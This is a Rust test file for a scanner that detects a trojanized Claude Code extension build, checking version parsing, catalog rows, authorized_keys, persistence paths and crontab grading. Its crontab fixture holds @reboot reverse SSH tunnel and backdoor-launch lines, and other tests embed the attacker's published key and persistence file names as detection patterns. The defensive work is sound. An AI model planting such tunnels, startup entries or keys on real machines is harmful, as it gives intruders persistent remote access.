//! The 2026-10-29 trojanized Claude Code extension (`anthropic.claude-code` 2.1.313,
//! served only by the Cursor Marketplace) and the advisories published around it.
//!
//! Sources: Cursor, "Claude Code extension security notice", 2026-10-29,
//! https://cursor.com/blog/claude-code-extension-security-notice; OpenSourceMalware,
//! "Trojanized Claude Code extension plants persistent SSH backdoor", 2026-10-30,
//! https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor.
//!
//! Every end-to-end test builds a temporary HOME holding inert shapes only (empty
//! persistence files, a manifest, an `extension.js` that is a comment, public keys) and
//! runs the real binary. The file compiles against fd9a1c3 (it reads the report as JSON
//! and grades it with `collect_findings`) and each test fails there on its assertions:
//! fd9a1c3 kept the platform suffix in an extension's version, had no 2.1.313 row, titled
//! a malware range row "Vulnerable", never read authorized_keys, had none of the
//! persistence paths, read no crontab, and skipped nothing but a per-extension
//! `.obsolete` file VS Code never writes.
#![cfg(unix)]

use base64::Engine as _;
use rustmachineguard::analysis::{Finding, Severity, collect_findings};
use rustmachineguard::models::ScanReport;
use sha2::Digest as _;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

const ALL_LABELS: &[&str] = &[
    "ai",
    "frameworks",
    "ide",
    "extensions",
    "mcp",
    "node",
    "shell",
    "ssh",
    "authkeys",
    "cloud",
    "containers",
    "notebooks",
    "browser",
    "packages",
    "rules",
    "skills",
    "settings",
    "aicreds",
    "envfiles",
    "transcripts",
    "marketplaces",
    "vscodetasks",
    "gitconfig",
    "pypkgs",
    "npmpkgs",
    "jbplugins",
    "persistence",
    "lsp",
    "liveness",
    "playwright",
    "vibe",
    "statusline",
    "listeners",
    "agents",
];

fn temp_home(tag: &str) -> PathBuf {
    let home = std::env::temp_dir().join(format!("rmg-atk-{tag}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    fs::canonicalize(&home).unwrap()
}

fn write(path: &Path, text: &str) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, text).unwrap();
}

/// Run the scanner on `home` with only `keep` enabled; returns (report JSON, findings).
fn scan(home: &Path, keep: &[&str], extra: &[&str]) -> (serde_json::Value, Vec<Finding>) {
    let skip: Vec<&str> = ALL_LABELS.iter().copied().filter(|l| !keep.contains(l)).collect();
    let out = Command::new(env!("CARGO_BIN_EXE_rmguard"))
        .args(["--format", "json", "--skip", &skip.join(",")])
        .args(extra)
        .env("HOME", home)
        .env("PATH", "/usr/bin:/bin")
        .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
        .env("NO_COLOR", "1")
        .current_dir(home)
        .output()
        .expect("run rmguard");
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    let value: serde_json::Value = serde_json::from_slice(&out.stdout).expect("report json");
    let report: ScanReport = serde_json::from_slice(&out.stdout).expect("report");
    (value, collect_findings(&report))
}

fn dump(findings: &[Finding]) -> String {
    findings
        .iter()
        .map(|f| format!("[{}] {} {}", f.severity.label(), f.category, f.title))
        .collect::<Vec<_>>()
        .join("\n")
}

fn exposures<'a>(findings: &'a [Finding], name: &str) -> Vec<&'a Finding> {
    findings
        .iter()
        .filter(|f| f.category == "Exposure" && f.title.contains(&format!("{name} ")))
        .collect()
}

/// An inert extension directory: a manifest and an `extension.js` that is a comment.
fn extension(dir: &Path, version_in_manifest: Option<&str>) {
    let mut pkg = serde_json::json!({"name": "claude-code", "publisher": "Anthropic", "main": "./extension.js"});
    if let Some(v) = version_in_manifest {
        pkg["version"] = v.into();
    }
    write(&dir.join("package.json"), &pkg.to_string());
    write(&dir.join("extension.js"), "// inert test fixture\n");
}

// ── A: platform-suffixed extension directories ──────────────────────────────────────

/// VS Code names a platform-specific install `<id>-<version>-<targetPlatform>`; the
/// version must not carry the platform. fd9a1c3 returned "2.1.313-linux-x64".
#[test]
fn platform_suffix_is_not_part_of_the_version() {
    use rustmachineguard::scanners::extensions::parse_extension_dir_name;
    for p in [
        "linux-x64",
        "darwin-arm64",
        "win32-x64",
        "alpine-arm64",
        "web",
        "universal",
    ] {
        assert_eq!(
            parse_extension_dir_name(&format!("anthropic.claude-code-2.1.313-{p}")),
            Some(("anthropic.claude-code".to_string(), "2.1.313".to_string())),
            "{p}"
        );
    }
    // A pre-release tail is not a platform and stays.
    assert_eq!(
        parse_extension_dir_name("pub.ext-1.2.3-beta"),
        Some(("pub.ext".to_string(), "1.2.3-beta".to_string()))
    );
    assert_eq!(
        parse_extension_dir_name("ms-python.python-2024.1.0"),
        Some(("ms-python.python".to_string(), "2024.1.0".to_string()))
    );
}

/// Every exact-version vscode row of the built-in catalog matches a platform-specific
/// install of that version (no manifest, so the directory name alone decides). On
/// fd9a1c3 none of them did.
#[test]
fn every_exact_version_vscode_row_matches_a_platform_specific_install() {
    let rows: Vec<serde_json::Value> = serde_json::from_str(rustmachineguard::catalogs::BUILTIN_CATALOG).unwrap();
    let exact: Vec<(String, String)> = rows
        .iter()
        .filter(|r| r["ecosystem"] == "vscode")
        .filter_map(|r| Some((r["name"].as_str()?.to_string(), r["version"].as_str()?.to_string())))
        .collect();
    assert!(exact.len() >= 3, "{exact:?}");
    let home = temp_home("plat");
    for (i, (name, version)) in exact.iter().enumerate() {
        let plat = ["linux-x64", "darwin-arm64", "win32-x64", "linux-arm64"][i % 4];
        fs::create_dir_all(home.join(format!(".vscode/extensions/{name}-{version}-{plat}"))).unwrap();
    }
    let (_, f) = scan(&home, &["extensions"], &[]);
    for (name, version) in &exact {
        let hits: Vec<_> = exposures(&f, name)
            .into_iter()
            .filter(|x| x.title.contains(&format!("Known-bad vscode package: {name} {version}")))
            .collect();
        assert_eq!(hits.len(), 1, "{name} {version}:\n{}", dump(&f));
        assert_eq!(hits[0].severity, Severity::Critical);
    }
    let _ = fs::remove_dir_all(&home);
}

/// A well-formed manifest version is preferred over the directory name: a directory
/// whose suffix is not a known platform still matches through its package.json.
#[test]
fn manifest_version_is_preferred_when_well_formed() {
    let home = temp_home("manifest");
    extension(
        &home.join(".cursor/extensions/anthropic.claude-code-2.1.313-futureos-x99"),
        Some("2.1.313"),
    );
    // A malformed manifest version falls back to the directory name.
    extension(
        &home.join(".vscode/extensions/anthropic.claude-code-2.1.313-darwin-arm64"),
        Some("not a version"),
    );
    let (v, f) = scan(&home, &["extensions"], &[]);
    let hits = exposures(&f, "anthropic.claude-code");
    assert_eq!(hits.len(), 2, "{}", dump(&f));
    assert!(hits.iter().all(|h| h.severity == Severity::Critical));
    let rows = v["ide_extensions"].as_array().unwrap();
    assert!(rows.iter().all(|r| r["version"] == "2.1.313"), "{rows:?}");
    assert!(rows.iter().any(|r| r["target_platform"] == "darwin-arm64"), "{rows:?}");
    let _ = fs::remove_dir_all(&home);
}

// ── B: the 2.1.313 row ───────────────────────────────────────────────────────────────

/// The Cursor install of the trojanized build is one Critical "Known-bad" finding; the
/// clean 2.1.314 and 2.1.312 are not flagged.
#[test]
fn trojanized_claude_code_extension_in_cursor_is_known_bad() {
    let home = temp_home("cursor");
    extension(
        &home.join(".cursor/extensions/anthropic.claude-code-2.1.313-darwin-arm64"),
        Some("2.1.313"),
    );
    extension(
        &home.join(".cursor/extensions/anthropic.claude-code-2.1.314-darwin-arm64"),
        Some("2.1.314"),
    );
    extension(
        &home.join(".windsurf/extensions/anthropic.claude-code-2.1.312-linux-x64"),
        Some("2.1.312"),
    );
    let (_, f) = scan(&home, &["extensions"], &[]);
    let hits = exposures(&f, "anthropic.claude-code");
    assert_eq!(hits.len(), 1, "{}", dump(&f));
    assert_eq!(hits[0].severity, Severity::Critical);
    assert_eq!(hits[0].title, "Known-bad vscode package: anthropic.claude-code 2.1.313");
    assert_eq!(hits[0].location, "Cursor");
    let ev = hits[0].evidence.as_deref().unwrap_or("");
    assert!(ev.contains("malicious release"), "{ev}");
    let _ = fs::remove_dir_all(&home);
}

// ── C: malware matched through a range ──────────────────────────────────────────────

/// A `version_range` row marked `malware` (or citing a MAL- id, with no
/// advisory_severity) is reported as "Known-bad", Critical; a vulnerable range is still
/// "Vulnerable". The built-in `@zaip-ai/cli` row is such a range (7 consecutive bad
/// releases). fd9a1c3 titled both malware rows "Vulnerable ... version" and had no zaip
/// row.
#[test]
fn malware_range_rows_are_titled_known_bad() {
    let home = temp_home("malrange");
    let catalog = home.join("catalog.json");
    write(
        &catalog,
        &serde_json::json!([
            {"ecosystem": "npm", "name": "rmg-fixture-malrange", "version_range": ">=1.0.0, <=1.2.0", "malware": true,
             "advisory": "fixture: three hijacked releases"},
            {"ecosystem": "npm", "name": "rmg-fixture-malid", "version_range": "<2.0.0",
             "advisory": "fixture: OSV MAL-2026-99999"},
            {"ecosystem": "npm", "name": "rmg-fixture-vuln", "version_range": "<2.0.0", "advisory_severity": "medium",
             "advisory": "fixture: a vulnerable range (not MAL-2026-1 malware)"}
        ])
        .to_string(),
    );
    let proj = home.join("proj");
    for (name, version) in [
        ("rmg-fixture-malrange", "1.1.0"),
        ("rmg-fixture-malid", "1.0.0"),
        ("rmg-fixture-vuln", "1.0.0"),
        ("@zaip-ai/cli", "7.0.0"),
    ] {
        write(
            &proj.join("node_modules").join(name).join("package.json"),
            &serde_json::json!({"name": name, "version": version}).to_string(),
        );
    }
    write(
        &home.join(".claude.json"),
        &serde_json::json!({"projects": {proj.to_string_lossy(): {}}}).to_string(),
    );
    let (_, f) = scan(&home, &["npmpkgs"], &["--threat-catalog", catalog.to_str().unwrap()]);
    for (name, version) in [
        ("rmg-fixture-malrange", "1.1.0"),
        ("rmg-fixture-malid", "1.0.0"),
        ("@zaip-ai/cli", "7.0.0"),
    ] {
        let hits = exposures(&f, name);
        assert_eq!(hits.len(), 1, "{name}:\n{}", dump(&f));
        assert_eq!(hits[0].severity, Severity::Critical, "{name}");
        assert!(
            hits[0]
                .title
                .starts_with(&format!("Known-bad npm package: {name} {version}")),
            "{}",
            hits[0].title
        );
    }
    let vuln = exposures(&f, "rmg-fixture-vuln");
    assert_eq!(vuln.len(), 1, "{}", dump(&f));
    assert_eq!(vuln[0].severity, Severity::Medium);
    assert!(
        vuln[0].title.starts_with("Vulnerable npm package version"),
        "{}",
        vuln[0].title
    );
    let _ = fs::remove_dir_all(&home);
}

// ── D: authorized_keys ───────────────────────────────────────────────────────────────

/// The attacker's published public key, assembled from parts (it is public material:
/// both sources print its fingerprint, OSM its blob). Its fingerprint is checked against
/// the published one below, so the IOC test exercises the real indicator.
fn published_attacker_blob() -> String {
    [
        "AAAAC3NzaC1lZDI1NTE5AAAAI",
        "DdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P",
    ]
    .concat()
}

/// A synthetic ed25519-shaped public key blob (type string + 32 bytes), unique per seed.
fn synthetic_blob(seed: u8) -> String {
    let mut b = Vec::new();
    b.extend_from_slice(&11u32.to_be_bytes());
    b.extend_from_slice(b"ssh-ed25519");
    b.extend_from_slice(&32u32.to_be_bytes());
    b.extend((0..32u8).map(|i| i.wrapping_mul(7).wrapping_add(seed)));
    base64::engine::general_purpose::STANDARD.encode(b)
}

fn fingerprint(blob_b64: &str) -> String {
    let raw = base64::engine::general_purpose::STANDARD.decode(blob_b64).unwrap();
    let d = sha2::Sha256::digest(&raw);
    format!("SHA256:{}", base64::engine::general_purpose::STANDARD_NO_PAD.encode(d))
}

fn ssh_home(tag: &str, authorized_keys: &str, mode: u32) -> PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let home = temp_home(tag);
    let ssh = home.join(".ssh");
    fs::create_dir_all(&ssh).unwrap();
    fs::set_permissions(&ssh, fs::Permissions::from_mode(0o700)).unwrap();
    let f = ssh.join("authorized_keys");
    fs::write(&f, authorized_keys).unwrap();
    fs::set_permissions(&f, fs::Permissions::from_mode(mode)).unwrap();
    home
}

fn persistence_findings(f: &[Finding]) -> Vec<&Finding> {
    f.iter().filter(|x| x.category == "Persistence").collect()
}

#[test]
fn published_fingerprint_is_the_published_blobs() {
    assert_eq!(
        fingerprint(&published_attacker_blob()),
        "SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk"
    );
}

/// The published key is Critical; the blob never reaches the report.
#[test]
fn known_attacker_key_in_authorized_keys_is_critical() {
    let blob = published_attacker_blob();
    let benign = synthetic_blob(1);
    let home = ssh_home(
        "akioc",
        &format!("ssh-ed25519 {benign} me@laptop\nssh-ed25519 {blob} svc-telemetry\n"),
        0o600,
    );
    let out = Command::new(env!("CARGO_BIN_EXE_rmguard"))
        .args(["--format", "json", "--skip"])
        .arg(
            ALL_LABELS
                .iter()
                .copied()
                .filter(|l| *l != "authkeys")
                .collect::<Vec<_>>()
                .join(","),
        )
        .env("HOME", &home)
        .env("PATH", "/usr/bin:/bin")
        .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
        .current_dir(&home)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(!text.contains(&blob[20..]), "the attacker blob reached the report");
    assert!(!text.contains(&benign[20..]), "a key blob reached the report");
    let (v, f) = scan(&home, &["authkeys"], &[]);
    let p = persistence_findings(&f);
    assert_eq!(p.len(), 1, "{}", dump(&f));
    assert_eq!(p[0].severity, Severity::Critical);
    assert!(
        p[0].title.starts_with("Known attacker SSH key in authorized_keys"),
        "{}",
        p[0].title
    );
    assert!(
        p[0].evidence
            .as_deref()
            .unwrap()
            .contains("SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk")
    );
    let file = &v["authorized_keys"][0];
    assert_eq!(file["key_count"], 2);
    assert_eq!(file["mode"], "0600");
    assert_eq!(file["keys"][0]["fingerprint"], fingerprint(&benign));
    assert_eq!(file["keys"][1]["line"], 2);
    let _ = fs::remove_dir_all(&home);
}

/// The campaign's comment on a key that is not the published one is High.
#[test]
fn backdoor_comment_with_unknown_fingerprint_is_high() {
    let blob = synthetic_blob(2);
    let home = ssh_home("akcomment", &format!("ssh-ed25519 {blob} svc-telemetry\n"), 0o600);
    let (_, f) = scan(&home, &["authkeys"], &[]);
    let p = persistence_findings(&f);
    assert_eq!(p.len(), 1, "{}", dump(&f));
    assert_eq!(p[0].severity, Severity::High);
    assert!(p[0].title.contains("svc-telemetry"), "{}", p[0].title);
    let _ = fs::remove_dir_all(&home);
}

/// An ordinary key is inventory only: fingerprint, type, comment and option NAMES.
#[test]
fn benign_authorized_key_is_inventory_only() {
    let blob = synthetic_blob(3);
    let home = ssh_home(
        "akbenign",
        &format!(
            "# my keys\nno-pty,command=\"/usr/bin/rrsync -ro /srv\",from=\"10.0.0.0/8\" ssh-ed25519 {blob} backup@nas\n"
        ),
        0o600,
    );
    let (v, f) = scan(&home, &["authkeys"], &[]);
    assert!(persistence_findings(&f).is_empty(), "{}", dump(&f));
    let file = &v["authorized_keys"][0];
    assert_eq!(file["source"], "default");
    let key = &file["keys"][0];
    assert_eq!(key["fingerprint"], fingerprint(&blob));
    assert_eq!(key["key_type"], "ssh-ed25519");
    assert_eq!(key["comment"], "backup@nas");
    assert_eq!(key["options"], serde_json::json!(["no-pty", "command", "from"]));
    let text = v.to_string();
    assert!(
        !text.contains("rrsync") && !text.contains("10.0.0.0"),
        "option values leaked"
    );
    let _ = fs::remove_dir_all(&home);
}

/// An authorized_keys file other users can write is High.
#[test]
fn group_writable_authorized_keys_is_high() {
    let blob = synthetic_blob(4);
    let home = ssh_home("akwritable", &format!("ssh-ed25519 {blob} me@laptop\n"), 0o664);
    let (v, f) = scan(&home, &["authkeys"], &[]);
    let p = persistence_findings(&f);
    assert_eq!(p.len(), 1, "{}", dump(&f));
    assert_eq!(p[0].severity, Severity::High);
    assert!(
        p[0].title.contains("can be changed by other local users"),
        "{}",
        p[0].title
    );
    assert_eq!(v["authorized_keys"][0]["writable_by"], "file");
    let _ = fs::remove_dir_all(&home);
}

/// A symlinked authorized_keys is listed by its link text and never opened.
#[test]
fn symlinked_authorized_keys_is_not_followed() {
    let home = temp_home("aklink");
    fs::create_dir_all(home.join(".ssh")).unwrap();
    write(
        &home.join("elsewhere/keys"),
        &format!("ssh-ed25519 {} svc-telemetry\n", synthetic_blob(5)),
    );
    std::os::unix::fs::symlink(home.join("elsewhere/keys"), home.join(".ssh/authorized_keys")).unwrap();
    let (v, f) = scan(&home, &["authkeys"], &[]);
    assert!(persistence_findings(&f).is_empty(), "{}", dump(&f));
    let file = &v["authorized_keys"][0];
    assert!(file["symlink"].as_str().unwrap().ends_with("elsewhere/keys"), "{file}");
    assert_eq!(file["key_count"], 0);
    let _ = fs::remove_dir_all(&home);
}

/// A readable sshd_config's `AuthorizedKeysFile` adds its files (here through an
/// `Include`d drop-in); the default files are still read.
#[test]
fn sshd_config_authorized_keys_file_is_followed() {
    let blob = synthetic_blob(6);
    let home = ssh_home(
        "aksshd",
        &format!("ssh-ed25519 {} me@laptop\n", synthetic_blob(7)),
        0o600,
    );
    write(
        &home.join("sysroot/etc/ssh/sshd_config"),
        "Include /etc/ssh/sshd_config.d/*.conf\nPort 22\nMatch User nobody\n  AuthorizedKeysFile /nowhere\n",
    );
    write(
        &home.join("sysroot/etc/ssh/sshd_config.d/10-keys.conf"),
        "AuthorizedKeysFile .ssh/authorized_keys %h/.config/keys/%u\n",
    );
    let user = current_user();
    let keys = home.join(format!(".config/keys/{user}"));
    write(&keys, &format!("ssh-ed25519 {blob} svc-telemetry\n"));
    {
        // Explicit modes, so a umask of 002 does not add a "writable" finding.
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&keys, fs::Permissions::from_mode(0o600)).unwrap();
        fs::set_permissions(keys.parent().unwrap(), fs::Permissions::from_mode(0o700)).unwrap();
    }
    let (v, f) = scan(&home, &["authkeys"], &[]);
    let files = v["authorized_keys"].as_array().unwrap();
    assert_eq!(files.len(), 2, "{files:?}");
    assert!(files.iter().all(|x| x["sshd_config"] == "read"));
    assert_eq!(files[1]["source"], "sshd_config");
    let p = persistence_findings(&f);
    assert_eq!(p.len(), 1, "{}", dump(&f));
    assert_eq!(p[0].severity, Severity::High);
    let _ = fs::remove_dir_all(&home);
}

fn current_user() -> String {
    let out = Command::new("id").arg("-un").output().expect("id -un");
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

// ── E: persistence paths and the crontab ────────────────────────────────────────────

/// The three published persistence paths are Critical worm IOCs.
#[test]
fn extension_backdoor_persistence_paths_are_critical() {
    let home = temp_home("persist");
    write(&home.join(".config/.smt"), "");
    write(&home.join(".config/.smtk"), "");
    write(
        &home.join("Library/LaunchAgents/com.apple.sysmond.plist"),
        "<?xml version=\"1.0\"?><plist version=\"1.0\"><dict/></plist>\n",
    );
    let (_, f) = scan(&home, &["persistence"], &[]);
    let p: Vec<_> = persistence_findings(&f)
        .into_iter()
        .filter(|x| x.title.contains("trojanized Claude Code extension 2.1.313"))
        .collect();
    assert_eq!(p.len(), 3, "{}", dump(&f));
    assert!(p.iter().all(|x| x.severity == Severity::Critical));
    let _ = fs::remove_dir_all(&home);
}

/// A readable user crontab: an `@reboot` entry naming `.smt` is Critical, an `@reboot`
/// SSH reverse tunnel is High, anything else is nothing.
#[test]
fn reboot_crontab_entries_are_graded() {
    let home = temp_home("cron");
    let user = current_user();
    write(
        &home.join(format!("sysroot/var/spool/cron/crontabs/{user}")),
        "# m h dom mon dow command\nAPI_TOKEN=notreal\n@reboot /bin/sh $HOME/.config/.smt >/dev/null 2>&1\n@reboot autossh -M 0 -o ServerAliveInterval=30 -N -R 2222:localhost:22 me@example.org\n@reboot /usr/bin/backup.sh\n0 3 * * * ssh -N -R 1:localhost:22 x@y\n",
    );
    let (v, f) = scan(&home, &["persistence"], &[]);
    let p: Vec<_> = persistence_findings(&f)
        .into_iter()
        .filter(|x| x.location.contains("crontabs"))
        .collect();
    assert_eq!(p.len(), 2, "{}", dump(&f));
    assert_eq!(p.iter().filter(|x| x.severity == Severity::Critical).count(), 1);
    assert_eq!(p.iter().filter(|x| x.severity == Severity::High).count(), 1);
    assert!(!v.to_string().contains("notreal"), "crontab content leaked");
    let _ = fs::remove_dir_all(&home);
}

// ── G: VS Code's root `.obsolete` ────────────────────────────────────────────────────

/// VS Code keeps one `.obsolete` file at the extensions root. A listed 2.1.313 directory
/// is still inventoried (marked obsolete) and still a Critical finding, titled as
/// superseded; a per-extension `.obsolete` file (which VS Code never writes) no longer
/// hides an extension. fd9a1c3 skipped the latter and never marked the former.
#[test]
fn root_obsolete_marks_rows_and_the_malware_finding_still_fires() {
    let home = temp_home("obsolete");
    let ext = home.join(".cursor/extensions");
    extension(&ext.join("anthropic.claude-code-2.1.313-darwin-arm64"), Some("2.1.313"));
    extension(&ext.join("anthropic.claude-code-2.1.314-darwin-arm64"), Some("2.1.314"));
    write(
        &ext.join(".obsolete"),
        r#"{"anthropic.claude-code-2.1.313-darwin-arm64":true,"gone.ext-1.0.0":true}"#,
    );
    // A per-extension marker an attacker could drop to hide a directory.
    let hidden = home.join(".vscode/extensions/anthropic.claude-code-2.1.313-linux-x64");
    extension(&hidden, Some("2.1.313"));
    write(&hidden.join(".obsolete"), "");
    let (v, f) = scan(&home, &["extensions"], &[]);
    let rows = v["ide_extensions"].as_array().unwrap();
    assert_eq!(rows.len(), 3, "{rows:?}");
    let obsolete: Vec<_> = rows.iter().filter(|r| r["obsolete"] == true).collect();
    assert_eq!(obsolete.len(), 1, "{rows:?}");
    assert_eq!(obsolete[0]["version"], "2.1.313");
    let hits = exposures(&f, "anthropic.claude-code");
    assert_eq!(hits.len(), 2, "{}", dump(&f));
    assert!(hits.iter().all(|h| h.severity == Severity::Critical));
    let superseded: Vec<_> = hits
        .iter()
        .filter(|h| h.title.ends_with("(superseded, files still on disk)"))
        .collect();
    assert_eq!(superseded.len(), 1, "{}", dump(&f));
    assert_eq!(superseded[0].location, "Cursor");
    let _ = fs::remove_dir_all(&home);
}
